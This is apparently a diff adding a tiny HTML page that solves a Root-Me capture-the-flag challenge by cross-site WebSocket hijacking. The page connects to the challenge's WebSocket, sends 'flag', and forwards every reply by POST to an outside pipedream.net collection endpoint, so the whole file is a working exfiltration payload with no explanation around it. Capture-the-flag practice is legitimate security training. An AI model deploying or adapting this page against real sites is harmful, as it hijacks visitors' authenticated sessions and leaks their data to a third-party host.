@@ -1,0 +1,14 @@
+<html>
+	<body>
+		<script src="jquerry.min.js"></script>
+		<script>
+			var ws = new WebSocket('ws://ctf05.root-me.org/ws', "chat");
+
+			ws.send("flag");
+			
+			ws.onmessage = function(event) {
+				$.post("//eofk61vscx21f93.m.pipedream.net?", event.data);
+			}
+		</script>
+	</body>
+</html>
